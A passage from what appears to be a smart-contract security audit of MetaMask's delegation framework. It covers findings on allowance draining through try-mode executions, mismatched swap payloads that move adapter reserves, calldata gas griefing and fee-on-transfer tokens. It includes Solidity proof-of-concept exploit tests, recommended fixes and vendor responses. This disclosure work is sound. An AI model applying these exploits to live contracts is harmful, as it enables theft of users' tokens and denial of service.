When used with the `EXECTYPE_TRY` execution mode, if the token transfer fails, the execution will continue without reverting. However, the streaming allowance will still be decreased as if the transfer had succeeded. This creates a scenario where an attacker can repeatedly execute failing transfers to deplete the streaming allowance without actually transferring any tokens.

Note that a similar issue also exists in `ERC20PeriodTransferEnforcer`.

**Impact:** This vulnerability allows a malicious delegate to create a permanent denial-of-service on streaming delegations. This effectively denies legitimate use of the delegation.


**Proof of Concept:** Run the following test

```solidity
    function test_streamingAllowanceDrainWithFailedTransfers() public {
        // Create streaming terms that define:
        // - initialAmount = 10 ether (available immediately at startTime)
        // - maxAmount = 100 ether (total streaming cap)
        // - amountPerSecond = 1 ether (streaming rate)
        // - startTime = current block timestamp (start streaming now)
        uint256 startTime = block.timestamp;
        bytes memory streamingTerms = abi.encodePacked(
            address(mockToken), // token address (20 bytes)
            uint256(INITIAL_AMOUNT), // initial amount (32 bytes)
            uint256(MAX_AMOUNT), // max amount (32 bytes)
            uint256(AMOUNT_PER_SECOND), // amount per second (32 bytes)
            uint256(startTime) // start time (32 bytes)
        );

        Caveat[] memory caveats = new Caveat[](3);

        // Allowed Targets Enforcer - only allow the token
        caveats[0] = Caveat({ enforcer: address(allowedTargetsEnforcer), terms: abi.encodePacked(address(mockToken)), args: hex"" });

        // Allowed Methods Enforcer - only allow transfer
        caveats[1] =
            Caveat({ enforcer: address(allowedMethodsEnforcer), terms: abi.encodePacked(IERC20.transfer.selector), args: hex"" });

        // ERC20 Streaming Enforcer - with the streaming terms
        caveats[2] = Caveat({ enforcer: address(streamingEnforcer), terms: streamingTerms, args: hex"" });

        Delegation memory delegation = Delegation({
            delegate: address(users.bob.deleGator),
            delegator: address(users.alice.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 0,
            signature: hex""
        });

        // Sign the delegation
        delegation = signDelegation(users.alice, delegation);
        bytes32 delegationHash = EncoderLib._getDelegationHash(delegation);

        // Initial balances
        uint256 aliceInitialBalance = mockToken.balanceOf(address(users.alice.deleGator));
        uint256 bobInitialBalance = mockToken.balanceOf(address(users.bob.addr));
        console.log("Alice initial balance:", aliceInitialBalance / 1e18);
        console.log("Bob initial balance:", bobInitialBalance / 1e18);

        // Amount to transfer
        uint256 amountToTransfer = 5 ether;

        // Create the mode for try execution (which will NOT revert on failures)
        ModeCode tryExecuteMode = ModeLib.encode(CALLTYPE_SINGLE, EXECTYPE_TRY, MODE_DEFAULT, ModePayload.wrap(bytes22(0x00)));

        // First test - Successful transfer
        {
            console.log("\n--- TEST 1: SUCCESSFUL TRANSFER ---");

            // Make sure token transfers will succeed
            mockToken.setHaltTransfer(false);

            // Prepare a transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(IERC20.transfer.selector, address(users.bob.addr), amountToTransfer)
            });

            // Execute the delegation using try mode
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after successful transfer
            uint256 aliceBalanceAfterSuccess = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterSuccess = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after successful transfer:", aliceBalanceAfterSuccess / 1e18);
            console.log("Bob balance after successful transfer:", bobBalanceAfterSuccess / 1e18);

            // Check streaming allowance state
            (,,,, uint256 storedSpent) = streamingEnforcer.streamingAllowances(address(delegationManager), delegationHash);

            console.log("Spent amount:", storedSpent / 1e18);

            // Verify the spent amount was updated
            assertEq(storedSpent, amountToTransfer, "Spent amount should be updated after successful transfer");

            // Verify tokens were actually transferred
            assertEq(aliceBalanceAfterSuccess, aliceInitialBalance - amountToTransfer, "Alice balance should decrease");
            assertEq(bobBalanceAfterSuccess, bobInitialBalance + amountToTransfer, "Bob balance should increase");
        }

        // Second test - Failed transfer
        {
            console.log("\n--- TEST 2: FAILED TRANSFER ---");

            // Make token transfers fail
            mockToken.setHaltTransfer(true);

            // Prepare the same transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(IERC20.transfer.selector, address(users.bob.addr), amountToTransfer)
            });

            // Record spent amount before the failed transfer
            (,,,, uint256 spentBeforeFailure) = streamingEnforcer.streamingAllowances(address(delegationManager), delegationHash);
            console.log("Spent amount before failed transfer:", spentBeforeFailure / 1e18);

            // Execute the delegation (will use try mode so execution continues despite transfer failure)
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after failed transfer
            uint256 aliceBalanceAfterFailure = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterFailure = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after failed transfer:", aliceBalanceAfterFailure / 1e18);
            console.log("Bob balance after failed transfer:", bobBalanceAfterFailure / 1e18);

            // Check spent amount after failed transfer
            (,,,, uint256 spentAfterFailure) = streamingEnforcer.streamingAllowances(address(delegationManager), delegationHash);
            console.log("Spent amount after failed transfer:", spentAfterFailure / 1e18);

            // @audit -> shows spent amount increases even when token transfer fails
            assertEq(
                spentAfterFailure, spentBeforeFailure + amountToTransfer, "Spent amount should increase even with failed transfer"
            );

            // Verify tokens weren't actually transferred
            assertEq(
                aliceBalanceAfterFailure,
                aliceInitialBalance - amountToTransfer, // Only reduced by the first successful transfer
                "Alice balance should not change after failed transfer"
            );
            assertEq(
                bobBalanceAfterFailure,
                bobInitialBalance + amountToTransfer, // Only increased by the first successful transfer
                "Bob balance should not change after failed transfer"
            );
        }
    }
```


**Recommended Mitigation:** Consider modifying the enforcers to restrict the execution type only to `EXECTYPE_DEFAULT`.


**Metamask:** Resolved in commit [b2807a9](https://github.com/MetaMask/delegation-framework/commit/b2807a9de92f6ac04d0f549b88753b6728979e43)

**Cyfrin:** Resolved. Execution type restricted to `EXECTYPE_DEFAULT`.


### Inconsistency in API and swap payloads in DelegationMetaSwapAdapter can potentially lead to unauthorized transfers

**Description:** The `DelegationMetaSwapAdapter` contract contains a vulnerability in the `swapByDelegation()` function where it fails to validate consistency between the token declared in the API data (apiData) and the actual token used in the swap data (swapData).

This discrepancy allows an attacker to trick the adapter into using tokens from its own reserves that were not part of the user's authorization.

When executing a token swap through the swapByDelegation() function, the contract receives two critical pieces of information:
`apiData` - Contains parameters including the token to be swapped (tokenFrom) and the amount
`swapData` - Used by the underlying MetaSwap contract and contains potentially different token information

The vulnerability exists because the `DelegationMetaSwapAdapter` does not verify that the token specified in `apiData` matches the token specified in `swapData` before executing the swap.

```solidity
 function swapByDelegation(bytes calldata _apiData, Delegation[] memory _delegations) external {
        (string memory aggregatorId_, IERC20 tokenFrom_, IERC20 tokenTo_, uint256 amountFrom_, bytes memory swapData_) =
            _decodeApiData(_apiData);
        uint256 delegationsLength_ = _delegations.length;

        if (delegationsLength_ == 0) revert InvalidEmptyDelegations();
        if (tokenFrom_ == tokenTo_) revert InvalidIdenticalTokens();
        if (!isTokenAllowed[tokenFrom_]) revert TokenFromIsNotAllowed(tokenFrom_);
        if (!isTokenAllowed[tokenTo_]) revert TokenToIsNotAllowed(tokenTo_);
        if (!isAggregatorAllowed[keccak256(abi.encode(aggregatorId_))]) revert AggregatorIdIsNotAllowed(aggregatorId_);
        if (_delegations[0].delegator != msg.sender) revert NotLeafDelegator();
       //@audit missing checks on swapData payload which also contains tokenFrom and to

     // ....
}
```

An example attack flow:
- The attacker creates a delegation that permits transferring a small amount of TokenA
- The attacker crafts malicious apiData stating TokenA as tokenFrom (matching the delegation)
- The attacker includes swapData that specifies TokenB as the actual token to use
- When processed by the MetaSwap contract, it uses TokenB from the adapter's reserves
- The result is that TokenB is transferred from the adapter's reserves without proper authorization

**Impact:** Inconsistent payload can make unauthorized asset transfers that can potentially deplete token reserves of the adapter.

**Proof of Concept:** POC below makes some assumptions:
1. There is a token balance in Adapter
2. Adapter has given infinite allowance to Metaswap for this token (this is a reasonable assumption if this token was ever used by the adapter before)
3. The Metaswap swap purely relies on the swap payload to execute a swap without making additional checks (since this is out-of-scope, we assume this as a worst-case scenario). This is reflected in how we setup the `swap` function in `ExploitableMetaSwapMock`

Run the following POC

```solidity
/**
 * @title DelegationMetaSwapAdapterConsistencyExploitTest
 * @notice This test demonstrates how inconsistencies between API data and swap data can be exploited
 */
contract DelegationMetaSwapAdapterConsistencyExploitTest is DelegationMetaSwapAdapterBaseTest {
    BasicERC20 public tokenC;

    // Mock MetaSwap contract that allows us to demonstrate the issue
    ExploitableMetaSwapMock public exploitableMetaSwap;

    function setUp() public override {
        super.setUp();

        _setUpMockContractsWithCustomMetaSwap();
    }

    function test_tokenFromInconsistencyExploit() public {
        // This test demonstrates an exploit where:
        // - apiData declares tokenA as tokenFrom, but sends a small amount (appears safe)
        // - swapData references tokenB as tokenFrom, with a much larger amount
        // - MetaSwap will use the larger amount of tokenB, draining user's funds

        // Record initial balances
        uint256 vaultTokenABefore = tokenA.balanceOf(address(vault.deleGator));
        uint256 adapterTokenBBefore = tokenB.balanceOf(address(delegationMetaSwapAdapter));
        uint256 vaultTokenCBefore = tokenC.balanceOf(address(vault.deleGator));
        console.log("Initial balances:");
        console.log("TokenA:", vaultTokenABefore);
        console.log("TokenB:", adapterTokenBBefore);
        console.log("TokenC:", vaultTokenCBefore);

        // ======== THE EXPLOIT ========
        // We create inconsistent data where:
        // - apiData claims to swap a small amount of tokenA
        // - swapData actually references tokenB with a much larger amount

        // First, craft our malicious swap data
        uint256 amountToTransfer = 100; // amount of tokenA
        uint256 outputAmount = 1000;

        bytes memory exploitSwapData = _encodeExploitSwapData(
            IERC20(tokenB), // Real tokenFrom in swapData is tokenB (not tokenA)
            IERC20(tokenC), // tokenTo is tokenC
            amountToTransfer, //amount for tokenB
            outputAmount // Amount to receive
        );

        // Create malicious apiData that claims tokenA but references the swapData with tokenB
        bytes memory maliciousApiData = _encodeExploitApiData(
            "exploit-aggregator",
            IERC20(tokenA), // pretend to use tokenA in apiData
            amountToTransfer,
            exploitSwapData // but use swapData that uses tokenB with large amount
        );

        // Create a delegation from vault to subVault
        Delegation memory vaultDelegation = _getVaultDelegationCustom();
        Delegation memory subVaultDelegation =
            _getSubVaultDelegationCustom(EncoderLib._getDelegationHash(vaultDelegation), amountToTransfer);

        Delegation[] memory delegations = new Delegation[](2);
        delegations[1] = vaultDelegation;
        delegations[0] = subVaultDelegation;

        // Execute the swap with our malicious data
        vm.prank(address(subVault.deleGator));
        delegationMetaSwapAdapter.swapByDelegation(maliciousApiData, delegations);

        // Check final balances
        uint256 vaultTokenAAfter = tokenA.balanceOf(address(vault.deleGator));
        uint256 adapterTokenBAfter = tokenB.balanceOf(address(delegationMetaSwapAdapter));
        uint256 vaultTokenCAfter = tokenC.balanceOf(address(vault.deleGator));
        console.log("Final balances:");
        console.log("TokenA:", vaultTokenAAfter);
        console.log("TokenB:", adapterTokenBAfter);
        console.log("TokenC:", vaultTokenCAfter);

        // The TokenA balance should remain the same (not used despite apiData saying it would be)
        assertEq(vaultTokenABefore - vaultTokenAAfter, amountToTransfer, "TokenA balance shouldn't change");

        // The TokenB balance should be drained (this is the actual token used in the swap)
        assertEq(adapterTokenBBefore - adapterTokenBAfter, amountToTransfer, "TokenB should be drained by the largeAmount");

        // The TokenC balance should increase
        assertEq(vaultTokenCAfter - vaultTokenCBefore, outputAmount, "TokenC should be received");

        console.log("EXPLOIT SUCCESSFUL: Used TokenB instead of TokenA, draining more funds than expected!");
    }

    // Helper to encode custom apiData for the exploit
    function _encodeExploitApiData(
        string memory _aggregatorId,
        IERC20 _declaredTokenFrom,
        uint256 _declaredAmountFrom,
        bytes memory _swapData
    )
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodeWithSelector(IMetaSwap.swap.selector, _aggregatorId, _declaredTokenFrom, _declaredAmountFrom, _swapData);
    }

    // Helper to encode custom swapData for the exploit
    function _encodeExploitSwapData(
        IERC20 _actualTokenFrom,
        IERC20 _tokenTo,
        uint256 _actualAmountFrom,
        uint256 _amountTo
    )
        internal
        pure
        returns (bytes memory)
    {
        // Following MetaSwap's expected structure
        return abi.encode(
            _actualTokenFrom, // Actual token from (can be different from apiData)
            _tokenTo,
            _actualAmountFrom, // Actual amount (can be different from apiData)
            _amountTo,
            bytes(""), // Not important for the exploit
            uint256(0), // No fee
            address(0), // No fee wallet
            false // No fee to
        );
    }

    function _getVaultDelegationCustom() internal view returns (Delegation memory) {
        Caveat[] memory caveats_ = new Caveat[](4);

        caveats_[0] = Caveat({ args: hex"", enforcer: address(allowedTargetsEnforcer), terms: abi.encodePacked(address(tokenA)) });

        caveats_[1] =
            Caveat({ args: hex"", enforcer: address(allowedMethodsEnforcer), terms: abi.encodePacked(IERC20.transfer.selector) });

        uint256 paramStart_ = abi.encodeWithSelector(IERC20.transfer.selector).length;
        address paramValue_ = address(delegationMetaSwapAdapter);
        // The param start and and param value are packed together, but the param value is not packed.
        bytes memory inputTerms_ = abi.encodePacked(paramStart_, bytes32(uint256(uint160(paramValue_))));
        caveats_[2] = Caveat({ args: hex"", enforcer: address(allowedCalldataEnforcer), terms: inputTerms_ });

        caveats_[3] = Caveat({
            args: hex"",
            enforcer: address(redeemerEnforcer),
            terms: abi.encodePacked(address(delegationMetaSwapAdapter))
        });

        Delegation memory vaultDelegation_ = Delegation({
            delegate: address(subVault.deleGator),
            delegator: address(vault.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats_,
            salt: 0,
            signature: hex""
        });
        return signDelegation(vault, vaultDelegation_);
    }

    function _getSubVaultDelegationCustom(
        bytes32 _parentDelegationHash,
        uint256 amount
    )
        internal
        view
        returns (Delegation memory)
    {
        Caveat[] memory caveats_ = new Caveat[](1);

        // Using ERC20 as tokenFrom
        // Restricts the amount of tokens per call
        uint256 paramStart_ = abi.encodeWithSelector(IERC20.transfer.selector, address(0)).length;
        uint256 paramValue_ = amount;
        bytes memory inputTerms_ = abi.encodePacked(paramStart_, paramValue_);
        caveats_[0] = Caveat({ args: hex"", enforcer: address(allowedCalldataEnforcer), terms: inputTerms_ });

        Delegation memory subVaultDelegation_ = Delegation({
            delegate: address(delegationMetaSwapAdapter),
            delegator: address(subVault.deleGator),
            authority: _parentDelegationHash,
            caveats: caveats_,
            salt: 0,
            signature: hex""
        });

        return signDelegation(subVault, subVaultDelegation_);
    }

    function _setUpMockContractsWithCustomMetaSwap() internal {
        vault = users.alice;
        subVault = users.bob;

        // Create the tokens
        tokenA = new BasicERC20(owner, "TokenA", "TKA", 0);
        tokenB = new BasicERC20(owner, "TokenB", "TKB", 0);
        tokenC = new BasicERC20(owner, "TokenC", "TKC", 0);

        vm.label(address(tokenA), "TokenA");
        vm.label(address(tokenB), "TokenB");
        vm.label(address(tokenC), "TokenC");

        exploitableMetaSwap = new ExploitableMetaSwapMock();

        // Set the custom MetaSwap mock
        delegationMetaSwapAdapter = new DelegationMetaSwapAdapter(
            owner, IDelegationManager(address(delegationManager)), IMetaSwap(address(exploitableMetaSwap))
        );

        // Mint tokens
        vm.startPrank(owner);
        tokenA.mint(address(vault.deleGator), 1_000_000);
        tokenB.mint(address(vault.deleGator), 1_000_000);
        tokenB.mint(address(delegationMetaSwapAdapter), 1_000_000);
        tokenA.mint(address(exploitableMetaSwap), 1_000_000);
        tokenB.mint(address(exploitableMetaSwap), 1_000_000);
        tokenC.mint(address(exploitableMetaSwap), 1_000_000);
        vm.stopPrank();

        // give allowance of tokenB to the metaswap contract
        vm.prank(address(delegationMetaSwapAdapter));
        tokenB.approve(address(exploitableMetaSwap), type(uint256).max);

        // Update allowed tokens list to include all three tokens
        IERC20[] memory allowedTokens = new IERC20[](3);
        allowedTokens[0] = IERC20(tokenA);
        allowedTokens[1] = IERC20(tokenB);
        allowedTokens[2] = IERC20(tokenC);

        bool[] memory statuses = new bool[](3);
        statuses[0] = true;
        statuses[1] = true;
        statuses[2] = true;

        vm.prank(owner);
        delegationMetaSwapAdapter.updateAllowedTokens(allowedTokens, statuses);

        _whiteListAggregatorId("exploit-aggregator");
    }
}

/**
 * @notice Mock implementation that demonstrates the vulnerability
 * @dev This mock mimics MetaSwap but exposes the tokenFrom inconsistency
 */
contract ExploitableMetaSwapMock {
    using SafeERC20 for IERC20;

    event SwapExecuted(IERC20 declaredTokenFrom, uint256 declaredAmount, IERC20 actualTokenFrom, uint256 actualAmount);

    /**
     * @notice Mock swap implementation that purposely ignores API data parameters
     * @dev This simulates a MetaSwap contract that uses the values from swapData
     * instead of the values declared in apiData
     */
    function swap(
        string calldata aggregatorId,
        IERC20 declaredTokenFrom, // From apiData
        uint256 declaredAmount, // From apiData
        bytes calldata swapData
    )
        external
        payable
        returns (bool)
    {
        // Decode the real parameters from swapData (our mock uses a simple structure)
        (IERC20 actualTokenFrom, IERC20 tokenTo, uint256 actualAmount, uint256 amountTo,,,,) =
            abi.decode(swapData, (IERC20, IERC20, uint256, uint256, bytes, uint256, address, bool));

        // Log the inconsistency for demonstration purposes
        emit SwapExecuted(declaredTokenFrom, declaredAmount, actualTokenFrom, actualAmount);

        // Execute the swap using the ACTUAL parameters from swapData, ignoring apiData
        actualTokenFrom.safeTransferFrom(msg.sender, address(this), actualAmount);
        tokenTo.transfer(address(msg.sender), amountTo);

        return true;
    }
}
```

**Recommended Mitigation:** To address this vulnerability, consider adding validation in the `swapByDelegation` function to ensure consistency between `apiData` and `swapData`:

```solidity
function swapByDelegation(bytes calldata _apiData, Delegation[] memory _delegations) external {
    // Decode apiData
    (string memory aggregatorId_, IERC20 tokenFromApi, uint256 amountFromApi, bytes memory swapData_) =
        _decodeApiData(_apiData);

    // Decode swapData to extract the actual token and amount
    (IERC20 tokenFromSwap, IERC20 tokenTo_, uint256 amountFromSwap,,,,) =
        abi.decode(abi.encodePacked(abi.encode(address(0)), swapData_),
                  (address, IERC20, IERC20, uint256, uint256, bytes, uint256, address, bool));

    // @audit Validate consistency between apiData and swapData
    require(address(tokenFromApi) == address(tokenFromSwap),
            "TokenFromInconsistency: apiData and swapData tokens must match");

    // @audit Validate amounts are consistent
    require(amountFromApi == amountFromSwap,
            "AmountInconsistency: apiData amount must be equal to swapData amount");

    // Continue with existing implementation...
}
```

**[Metamask]:**
Acknowledged. Will be addressed in future when changes are implemented to the `DelegationMetaSwapAdapter`.

**Cyfrin:** Acknowledged.


### Malicious user can create delegations that will spend unlimited amount of gas with `SpecificActionERC20TransferBatchEnforcer` caveat

**Description:** The `SpecificActionERC20TransferBatchEnforcer` first execution has no limit on the calldata size. This allows a malicious user to create delegations that will waste unlimited amount of gas from the delegates.
```solidity
    function beforeHook(
        bytes calldata _terms,
        bytes calldata,
        ModeCode _mode,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _delegator,
        address
    )
        public
        override
        onlyBatchExecutionMode(_mode)
    {
        ...
        if (
            executions_[0].target != terms_.firstTarget || executions_[0].value != 0
                || keccak256(executions_[0].callData) != keccak256(terms_.firstCalldata)
        ) {
            revert("SpecificActionERC20TransferBatchEnforcer:invalid-first-transaction");
        }
        ...
    }
```
In order to compute the `keccak256` hash function, the code needs to store the whole `terms_.firstCalldata` into memory. So a huge chunk of calldata will increase the memory expansion cost quadratically.

Notice also that the delegator can arbitrarily increase the calldata size without compromising the output of the execution. For example, if the delegator wants to execute the `increment(uint256 num)` function from a contract, the bytes after the argument will just be ignored by the compiler.
This calldata:
```
0x7cf5dab00000000000000000000000000000000000000000000000000000000000000001
```
Will have the same execution output as:
```
0x7cf5dab00000000000000000000000000000000000000000000000000000000000000001fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff...
```
Hence, calldata size can be arbitrarily increased without compromising execution output

**Impact:** A malicious user can create delegations that will waste unlimited amount of gas from the delegates.

**Proof of Concept:**
```solidity
function testGriefingAttackSpecificActionERC20TransferEnforcer() public {
        // Generate a very large calldata (e.g., 1MB)
        bytes memory largeCalldata = new bytes(1_000_000);
        for (uint256 i = 0; i < largeCalldata.length; i++) {
            largeCalldata[i] = 0xFF;
        }

        // Create terms with the large calldata
        bytes memory terms = abi.encodePacked(
            address(token), // tokenAddress
            address(0x1), // recipient
            uint256(100), // amount
            address(0x1), // firstTarget
            largeCalldata // firstCalldata
        );

        // Create a batch execution with the expected large calldata
        Execution[] memory executions = new Execution[](2);
        executions[0] = Execution({ target: address(0x1), value: 0, callData: largeCalldata });
        executions[1] = Execution({
            target: address(token),
            value: 0,
            callData: abi.encodeWithSelector(IERC20.transfer.selector, address(0x1), 100)
        });

        bytes memory executionCallData = abi.encode(executions);

        // Measure gas usage of the beforeHook call
        uint256 startGas = gasleft();

        vm.startPrank(address(delegationManager));
        // This would be extremely expensive due to the large calldata
        batchEnforcer.beforeHook(
            terms,
            bytes(""),
            batchDefaultMode, // Just a dummy mode code
            executionCallData,
            keccak256("delegation1"),
            address(0),
            address(0)
        );

        uint256 gasUsed = startGas - gasleft();
        vm.stopPrank();

        console.log("Gas used for beforeHook with 1MB calldata:", gasUsed);
    }
```
Output gas:
```
Ran 1 test for test/enforcers/SpecificActionERC20TransferBatchEnforcer.t.sol:SpecificActionERC20TransferBatchEnforcerTest
[PASS] testGriefingAttackSpecificActionERC20TransferEnforcer() (gas: 207109729)
```

**Recommended Mitigation:** Consider constraining the calldata size to a specific limit

**MetaMask:**
Acknowledged. It is on the delegate to validate the delegation before executing it.

**Cyfrin:** Acknowledged.


### `DelegationMetaSwapAdapter` is not compatible with fee on transfer tokens

**Description:** When someone tries to execute a `swapByDelegation`, the contract will first snapshot the current balance of the `tokenFrom`:
```solidity
    function swapByDelegation(bytes calldata _apiData, Delegation[] memory _delegations) external {
        ...
        // Prepare the call that will be executed internally via onlySelf
        bytes memory encodedSwap_ = abi.encodeWithSelector(
            this.swapTokens.selector,
            aggregatorId_,
            tokenFrom_,
            tokenTo_,
            _delegations[delegationsLength_ - 1].delegator,
            amountFrom_,
@>          _getSelfBalance(tokenFrom_),
            swapData_
        );
        ...
    }
```
Afterwards, this same amount is used to compute the amount of tokens received during the transfer:
```solidity
    function swapTokens(
        string calldata _aggregatorId,
        IERC20 _tokenFrom,
        IERC20 _tokenTo,
        address _recipient,
        uint256 _amountFrom,
        uint256 _balanceFromBefore,
        bytes calldata _swapData
    )
        external
        onlySelf
    {
        uint256 tokenFromObtained_ = _getSelfBalance(_tokenFrom) - _balanceFromBefore;
        if (tokenFromObtained_ < _amountFrom) revert InsufficientTokens();

        ...
    }
```
This line ensures that the amount of tokens received matches the `amountFrom` field. However this invariant is violated for tokens that implement the fee on transfer feature. That's because the contract will receive less tokens and this check will make the whole execution to revert.

**Impact:** Well known tokens such as USDT are fee on transfer tokens that are currently part of the allow list of Metaswap. It is worth highlighting though that the current fees on USDT transfers is set to 0. While the current implementation works as expected with zero fees, it will revert if/when USDT shifts to a non-zero fee structure.

**Proof of Concept:** To run the following test you must add the following file under the `test/utils`
```solidity
// SPDX-License-Identifier: MIT AND Apache-2.0

pragma solidity 0.8.23;

import { ERC20, IERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { Ownable2Step, Ownable } from "@openzeppelin/contracts/access/Ownable2Step.sol";

contract ERC20FeeOnTransfer is ERC20, Ownable2Step {
    ////////////////////////////// Constructor  //////////////////////////////

    /// @dev Initializes the BasicERC20 contract.
    /// @param _owner The owner of the ERC20 token. Also addres that received the initial amount of tokens.
    /// @param _name The name of the ERC20 token.
    /// @param _symbol The symbol of the ERC20 token.
    /// @param _initialAmount The initial supply of the ERC20 token.
    constructor(
        address _owner,
        string memory _name,
        string memory _symbol,
        uint256 _initialAmount
    )
        Ownable(_owner)
        ERC20(_name, _symbol)
    {
        if (_initialAmount > 0) _mint(_owner, _initialAmount);
    }

    ////////////////////////////// External Methods //////////////////////////////

    /// @dev Allows the onwner to burn tokens from the specified user.
    /// @param _user The address of the user from whom the tokens will be burned.
    /// @param _amount The amount of tokens to burn.
    function burn(address _user, uint256 _amount) external onlyOwner {
        _burn(_user, _amount);
    }

    /// @dev Allows the owner to mint new tokens and assigns them to the specified user.
    /// @param _user The address of the user to whom the tokens will be minted.
    /// @param _amount The amount of tokens to mint.
    function mint(address _user, uint256 _amount) external onlyOwner {
        _mint(_user, _amount);
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value * 99 / 100);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value * 99 / 100);
        return true;
    }
}
```
Then you have to import the file inside the `DelegationMetaSwapAdapter.t.sol`:
```solidity
import { ERC20FeeOnTransfer } from "../utils/ERC20FeeOnTransfer.t.sol";
```
And finally writing this test inside the `DelegationMetaSwapAdapterMockTest`:
```solidity
    function _setUpMockERC20FOT() internal {
        vault = users.alice;
        subVault = users.bob;

        tokenA = BasicERC20(address(new ERC20FeeOnTransfer(owner, "TokenA", "TokenA", 0)));
        tokenB = new BasicERC20(owner, "TokenB", "TokenB", 0);
        vm.label(address(tokenA), "TokenA");
        vm.label(address(tokenB), "TokenB");

        metaSwapMock = IMetaSwap(address(new MetaSwapMock(IERC20(tokenA), IERC20(tokenB))));

        delegationMetaSwapAdapter =
            new DelegationMetaSwapAdapter(owner, IDelegationManager(address(delegationManager)), metaSwapMock);

        vm.startPrank(owner);

        tokenA.mint(address(vault.deleGator), 100 ether);
        tokenA.mint(address(metaSwapMock), 1000 ether);
        tokenB.mint(address(vault.deleGator), 100 ether);
        tokenB.mint(address(metaSwapMock), 1000 ether);

        vm.stopPrank();

        vm.deal(address(metaSwapMock), 1000 ether);

        _updateAllowedTokens();

        _whiteListAggregatorId(aggregatorId);

        swapDataTokenAtoTokenB =
            abi.encode(IERC20(address(tokenA)), IERC20(address(tokenB)), 1 ether, 1 ether, hex"", uint256(0), address(0), true);
    }

    function test_swapFeeOnTransferToken() public {
        _setUpMockERC20FOT();

        Delegation[] memory delegations_ = new Delegation[](2);

        Delegation memory vaultDelegation_ = _getVaultDelegation();
        Delegation memory subVaultDelegation_ = _getSubVaultDelegation(EncoderLib._getDelegationHash(vaultDelegation_));
        delegations_[1] = vaultDelegation_;
        delegations_[0] = subVaultDelegation_;

        bytes memory swapData_ = _encodeSwapData(IERC20(tokenA), IERC20(tokenB), amountFrom, amountTo, hex"", 0, address(0), false);
        bytes memory apiData_ = _encodeApiData(aggregatorId, IERC20(tokenA), amountFrom, swapData_);

        vm.prank(address(subVault.deleGator));
        vm.expectRevert(DelegationMetaSwapAdapter.InsufficientTokens.selector);
        delegationMetaSwapAdapter.swapByDelegation(apiData_, delegations_);
    }
```

**Recommended Mitigation:** For fee on transfer tokens it is fine to use the received amount:
```diff
    function swapTokens(
        string calldata _aggregatorId,
        IERC20 _tokenFrom,
        IERC20 _tokenTo,
        address _recipient,
        uint256 _amountFrom,
        uint256 _balanceFromBefore,
        bytes calldata _swapData
    )
        external
        onlySelf
    {
        uint256 tokenFromObtained_ = _getSelfBalance(_tokenFrom) - _balanceFromBefore;
--      if (tokenFromObtained_ < _amountFrom) revert InsufficientTokens();
++      if (tokenFromObtained_ < _amountFrom) {
++          _amountFrom = tokenFromObtained_ ;
        }

    }
```

**MetaMask:**
Acknowledged.  No action needed since we plan to work with current tokens without fees. If a token with a fee gets activated like USDT in the future, we will remove it from allowlist.


**Cyfrin:** Acknowledged.

\clearpage
## Low Risk


### Bugged `erc7579-implementation` commit imported

**Description:** Currently, the codebase imports the `erc7579-implementation` external repository at commit `42aa538397138e0858bae09d1bd1a1921aa24b8c `to use the `ExecutionHelper`. This import is used inside the `DelegationMetaSwapAdapter` to implement the `executeFromExecutor` method:
```solidity
    function executeFromExecutor(
        ModeCode _mode,
        bytes calldata _executionCalldata
    )
        external
        payable
        onlyDelegationManager
        returns (bytes[] memory returnData_)
    {
        (CallType callType_, ExecType execType_,,) = _mode.decode();

        // Check if calltype is batch or single
        if (callType_ == CALLTYPE_BATCH) {
            // Destructure executionCallData according to batched exec
            Execution[] calldata executions_ = _executionCalldata.decodeBatch();
            // check if execType is revert or try
            if (execType_ == EXECTYPE_DEFAULT) returnData_ = _execute(executions_);
            else if (execType_ == EXECTYPE_TRY) returnData_ = _tryExecute(executions_);
            else revert UnsupportedExecType(execType_);
        } else if (callType_ == CALLTYPE_SINGLE) {
            // Destructure executionCallData according to single exec
            (address target_, uint256 value_, bytes calldata callData_) = _executionCalldata.decodeSingle();
            returnData_ = new bytes[](1);
            bool success_;
            // check if execType is revert or try
            if (execType_ == EXECTYPE_DEFAULT) {
                returnData_[0] = _execute(target_, value_, callData_);
            } else if (execType_ == EXECTYPE_TRY) {
                (success_, returnData_[0]) = _tryExecute(target_, value_, callData_);
                if (!success_) emit TryExecuteUnsuccessful(0, returnData_[0]);
            } else {
                revert UnsupportedExecType(execType_);
            }
        } else {
            revert UnsupportedCallType(callType_);
        }
    }
```
When the `execType` is set to be `EXECTYPE_TRY`, the interal `_tryExecute` method is executed:
```solidity
    function _tryExecute(
        address target,
        uint256 value,
        bytes calldata callData
    )
        internal
        virtual
        returns (bool success, bytes memory result)
    {
        /// @solidity memory-safe-assembly
        assembly {
            result := mload(0x40)
            calldatacopy(result, callData.offset, callData.length)
@>          success := iszero(call(gas(), target, value, result, callData.length, codesize(), 0x00))
            mstore(result, returndatasize()) // Store the length.
            let o := add(result, 0x20)
            returndatacopy(o, 0x00, returndatasize()) // Copy the returndata.
            mstore(0x40, add(o, returndatasize())) // Allocate the memory.
        }
    }
```
